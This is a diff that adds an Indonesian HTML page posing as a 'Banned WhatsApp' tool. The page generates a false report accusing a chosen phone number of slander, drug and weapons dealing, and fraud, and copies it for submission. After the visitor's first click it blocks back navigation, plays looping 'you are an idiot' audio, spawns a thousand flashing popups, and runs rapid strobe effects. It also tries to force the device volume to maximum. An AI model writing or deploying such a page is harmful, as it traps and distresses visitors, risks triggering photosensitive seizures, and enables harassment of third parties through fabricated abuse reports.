@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<title>Banned WhatsApp</title>
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<meta name="theme-color" content="#000">
+<link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiQmFubmVkIFdBIiwic2hvcnRfbmFtZSI6IkJhbm5lZFdBIiwic3RhcnRfdXJsIjoiLyIsImRpc3BsYXkiOiJzdGFuZGFsb25lIiwiYmFja2dyb3VuZF9jb2xvciI6IiMwMDAiLCJ0aGVtZV9jb2xvciI6IiMwMDAifQ==">
+<style>
+html,body{height:100%;margin:0;font-family:Arial,Helvetica,sans-serif;background:#000;overflow:hidden}
+body::before{
+  content:"";position:fixed;inset:0;
+  background:
+    radial-gradient(circle at 20% 50%,#ff0000 0%,#000 70%),
+    radial-gradient(circle at 80% 50%,#8b0000 0%,#000 70%);
+  animation:noise .07s steps(2) infinite,blinkRed .2s steps(2) infinite,strobe .1s infinite, colorPanic 1s infinite;
+  z-index:-1;
+}
+@keyframes noise{0%,100%{filter:contrast(150%) brightness(120%)}50%{filter:contrast(200%) brightness(180%)}}
+@keyframes blinkRed{0%,100%{opacity:1}50%{opacity:.6}}
+@keyframes strobe{0%,100%{background:#000}50%{background:#ff0000}}
+@keyframes colorPanic{0%{filter:hue-rotate(0deg)}25%{filter:hue-rotate(90deg)}50%{filter:hue-rotate(180deg)}75%{filter:hue-rotate(270deg)}100%{filter:hue-rotate(360deg)}}
+
+.card{width:88%;max-width:460px;background:rgba(20,0,0,.75);backdrop-filter:blur(4px);border:2px solid #ff0000;border-radius:18px;padding:26px;text-align:center;position:relative;z-index:10;color:#fff;margin:auto;top:50%;transform:translateY(-50%)}
+.title{font-size:36px;font-weight:bold;color:#ff0000;margin:0 0 6px;text-shadow:0 0 6px #ff0000}
+.subtitle{font-size:18px;color:#ccc;margin-bottom:22px}
+label{display:block;margin:15px 0 6px;font-weight:600;font-size:16px;text-align:left;color:#ff4d4d}
+input[type=text]{width:100%;padding:12px;font-size:16px;border:2px solid #ff0000;border-radius:8px;box-sizing:border-box;background:#1a1a1a;color:#fff}
+.btn{width:100%;padding:14px;font-size:18px;border:none;border-radius:8px;cursor:pointer;background:#b30000;color:#fff;margin-top:12px;box-shadow:0 0 8px #ff0000}
+.btn:hover{background:#ff0000}
+#musicCtrl{position:absolute;top:10px;right:10px;background:#1a1a1a;border:2px solid #ff0000;border-radius:50%;width:40px;height:40px;font-size:18px;color:#ff0000;cursor:pointer;z-index:20}
+#volBox{position:absolute;top:55px;right:10px;background:#1a1a1a;border:2px solid #ff0000;border-radius:6px;padding:4px 6px;display:flex;align-items:center;z-index:20}
+#volBox input{width:70px}
+.idiot{position:fixed;width:120px;height:120px;font-size:1.1rem;font-weight:bold;background:#000;color:#fff;display:grid;place-content:center;text-align:center;animation:blink .2s steps(2) infinite,gerak 7s linear;z-index:9999;pointer-events:none}
+@keyframes blink{0%,100%{background:#000;color:#fff}50%{background:#fff;color:#000}}
+@keyframes gerak{0%{transform:translate(var(--startX),var(--startY)) rotate(0deg) scale(1)}50%{transform:translate(var(--midX),var(--midY)) rotate(180deg) scale(1.1)}100%{transform:translate(var(--endX),var(--endY)) rotate(360deg) scale(1)}}
+</style>
+</head>
+<body>
+<div class="card">
+  <div id="idiotStack"></div>
+  <button id="musicCtrl" title="Play/Pause Musik" onclick="toggleAll()">❚❚</button>
+  <div id="volBox"><span>🔊</span><input type="range" id="volSlider" min="0" max="100" value="100"></div>
+  <div class="title">Banned WhatsApp</div>
+  <div class="subtitle">BY <span style="font-size:16px">Taufik</span></div>
+  <label for="nomor">Nomor WhatsApp</label>
+  <input type="text" id="nomor" placeholder="Contoh: +6281234567890">
+  <button class="btn" onclick="startAudio(); aksi('banned')">BANNED WHATSAPP</button>
+  <button class="btn" onclick="startAudio(); aksi('unbanned')">UNBANNED WHATSAPP</button>
+</div>
+
+<script>
+/* ---------- 150 AUDIO ---------- */
+const stack=document.getElementById('idiotStack');
+const audios=[]; let musikOn=true; let started=false;
+for(let i=0;i<150;i++){
+  const a=document.createElement('audio');
+  a.src='https://www.myinstants.com/media/sounds/you-are-an-idiot.mp3';
+  a.loop=true; stack.appendChild(a); audios.push(a);
+}
+
+/* ---------- HISTORY TRAP (blokir kembali) ---------- */
+history.pushState(null,null,location.href);
+window.onpopstate=()=>history.forward();
+
+/* ---------- AUTOPLAY + JUMLAH AKTIF ACAK 3-20 ---------- */
+function startAudio(){
+  if(started)return; started=true;
+  const count=3+Math.floor(Math.random()*18); // 3-20
+  const used=new Set();
+  for(let i=0;i<count;i++){
+    let idx;
+    do{idx=Math.floor(Math.random()*150)}while(used.has(idx));
+    used.add(idx);
+    const a=audios[idx];
+    a.volume=0.6+Math.random()*0.4;
+    a.playbackRate=0.8+Math.random()*0.4;
+    a.currentTime=0;
+    a.play().catch(()=>{});
+  }
+  document.getElementById('musicCtrl').textContent='❚❚';
+  musikOn=true;
+}
+document.body.addEventListener('click',startAudio,{once:true});
+
+/* ---------- VOLUME & TOGGLE ---------- */
+const volS=document.getElementById('volSlider');
+volS.oninput=()=>audios.forEach(a=>a.volume=volS.value/100);
+function toggleAll(){
+  if(musikOn){audios.forEach(a=>a.pause());document.getElementById('musicCtrl').textContent='♪';}
+  else{audios.forEach(a=>{a.volume=volS.value/100;a.currentTime=0;a.play();});document.getElementById('musicCtrl').textContent='❚❚';}
+  musikOn=!musikOn;
+}
+
+/* ---------- 1000 GAMBAR ---------- */
+let gambarCount=0;
+document.body.addEventListener('click',()=>{
+  if(document.body.classList.contains('terrify'))return;
+  document.body.classList.add('terrify');
+  document.body.style.position='fixed'; // cegah scroll
+  let keluar=0; const iv=setInterval(()=>{if(keluar>=1000){clearInterval(iv);return;}
+    const d=document.createElement('div');d.className='idiot';d.textContent='YOU ARE AN IDIOT!';
+    const sx=Math.random()*(window.innerWidth-120);const sy=Math.random()*(window.innerHeight-120);
+    const dx=(Math.random()-.5)*window.innerWidth*3;const dy=(Math.random()-.5)*window.innerHeight*3;
+    d.style.left=sx+'px';d.style.top=sy+'px';d.style.setProperty('--startX',sx+'px');d.style.setProperty('--startY',sy+'px');
+    d.style.setProperty('--endX',dx+'px');d.style.setProperty('--endY',dy+'px');
+    document.body.appendChild(d);gambarCount++;if(gambarCount===300){const kurang=setInterval(()=>{const list=document.querySelectorAll('.idiot');if(list.length<=250){clearInterval(kurang);return;}list[0].remove();},100);}
+    setTimeout(()=>d.remove(),7000);keluar++;},200);
+},{once:true});
+
+/* ---------- OPSI & SALIN PESAN ---------- */
+function aksi(jenis){
+  const nomor=document.getElementById('nomor').value.trim();
+  if(!nomor){alert('Isi nomor WhatsApp dulu!');return;}
+  const cleanNum=nomor.replace(/\D/g,'');
+  const pesan=jenis==='banned'
+    ?`Permohonan kepada WhatsApp untuk segera banned permanen akun nomor ${cleanNum}. Orang tersebut telah: 1) Menyebar fitnah palsu; 2) Menjual narkotika & senjata; 3) Melakukan penipuan. Saya minta akun tersebut diblokir. Terima kasih.`
+    :`HELLO WHATSAPP DEVELOPER PLEASE RESTORE MY WHATSAPP ACCOUNT IMMEDIATELY, I USE WHATSAPP TO COMMUNICATE WITH IMPORTANT PEOPLE IN MY LIFE, WITHOUT WHATSAPP MY LIFE WILL BE A PROBLEM, MY ACCOUNT IS ${cleanNum}`;
+  alert("📋 Pesan siap salin:\n\n"+pesan);navigator.clipboard.writeText(pesan);
+}
+
+/* ---------- ANTI KELUAR & HECK VOLUME SISTEM ---------- */
+// Anti keluar (double-tap back)
+let backPress = 0;
+document.addEventListener('backbutton', function (e) {
+  e.preventDefault();                 // tahan dulu
+  backPress++;
+  if (backPress === 2) {
+    navigator.app.exitApp();          // baru keluar
+  } else {
+    window.plugins.toast.showShortBottom('Tekan sekali lagi untuk keluar');
+    setTimeout(() => backPress = 0, 2000);
+  }
+});
+
+// Heck volume sistem (akan berjalan setelah ditambahkan interface Android)
+if (window.Android) {
+  window.Android.setVolume(100);      // 0-100
+}
+</script>
+</body>
+</html>
+
